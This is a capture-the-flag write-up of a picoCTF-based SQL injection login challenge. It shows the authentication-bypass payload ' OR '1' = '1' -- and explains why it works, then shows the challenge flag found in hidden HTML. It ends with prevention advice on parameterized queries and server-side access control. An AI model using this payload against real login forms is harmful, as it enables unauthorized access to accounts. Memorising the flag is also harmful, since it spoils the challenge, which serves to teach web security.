# SQLiLite – CyLab Security Academy

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Platform:** CyLab Security Academy  
**Original Challenge:** picoCTF  
**Vulnerability:** SQL Injection (Authentication Bypass)

---

## 1. Challenge Overview

The challenge provided a login page and asked us to log in to the website.

After successfully logging in, the application displayed the following message:

> Logged in! But can you see the flag, it is in plain sight.

The objective was to exploit the login mechanism and discover the hidden flag.

## 2. Initial Investigation

I inspected the login page and identified two input fields:

- Username
- Password

The application appeared to construct an SQL query using the supplied credentials.

This suggested a possible SQL Injection vulnerability.

## 3. Exploitation – SQL Injection

### Step 1: Authentication Bypass

I entered the following credentials:

**Username:**
```text
abc
```

**Password:**
```sql
' OR '1' = '1' --
```

The application displayed the SQL query it executed:

```sql
SELECT * FROM users
WHERE name='abc' AND password='' OR '1' = '1' --'
```

### Step 2: Understanding the Injection

The injected condition was:

```sql
OR '1' = '1'
```

Since `1 = 1` is always TRUE, the authentication condition became true.

SQL evaluates `AND` before `OR`, so the effective condition was:

```sql
(name='abc' AND password='') OR TRUE
```

The `--` sequence starts an SQL comment, causing the remaining SQL text to be ignored.

As a result, the authentication check was bypassed.

**Result:** Successfully logged in without knowing a valid password.

## 4. Finding the Hidden Flag

After authentication, the application displayed:

```text
Logged in! But can you see the flag, it is in plain sight.
```

Initially, the flag was not visible on the webpage.

I opened Chrome/Brave Developer Tools and navigated to the **Sources** tab.

Inside `login.php`, I inspected the HTML returned by the server.

I discovered the following code:

```html
<p hidden>
    Your flag is: academy{l00k5_11k3_y0u_s0lv3d_it_b57ed0cd}
</p>
```

The flag was present in the HTML but hidden from normal browser rendering.

## 5. Flag

```text
academy{l00k5_11k3_y0u_s0lv3d_it_b57ed0cd}
```

**Status:** Successfully solved!

---

## 6. Key Concepts Learned

### SQL Injection
SQL Injection occurs when an application inserts untrusted user input directly into an SQL query, allowing attackers to manipulate the query's intended logic.

### Authentication Bypass
An attacker can manipulate login conditions to gain access without providing valid credentials.

### Boolean Logic in SQL
The expression `1 = 1` always evaluates to TRUE. Combining it with `OR` can alter the logic of an authentication query.

### SQL Comments
The `--` sequence starts a single-line SQL comment in this context, allowing the injected query to ignore the remaining SQL syntax.

### HTML Hidden Attribute
The HTML `hidden` attribute prevents an element from being displayed normally.

However, it does not remove the element or its content from the HTML source.

### Browser Developer Tools
The Sources tab allows developers and security researchers to inspect resources and source code loaded by the browser.

---

## 7. Security Lessons

**Preventing SQL Injection:**
- Use prepared statements and parameterized queries.
- Never concatenate raw user input into SQL queries.
- Apply proper input validation.
- Use least-privilege database accounts.

**Protecting Sensitive Information:**
- Never send confidential information to the browser unless the user is authorized to access it.
- Do not rely on HTML attributes such as `hidden` or CSS `display: none` to protect sensitive information.
- Enforce access control on the server side.

---

## 8. Conclusion

This challenge demonstrated how a simple SQL Injection vulnerability can bypass authentication.

It also highlighted an important security mistake: hiding sensitive information in HTML does not make it secure.

By combining SQL Injection with browser source inspection, I successfully retrieved the flag.

**Skills Practiced:** Web Exploitation | SQL Injection | Authentication Bypass | HTML Inspection | Browser Developer Tools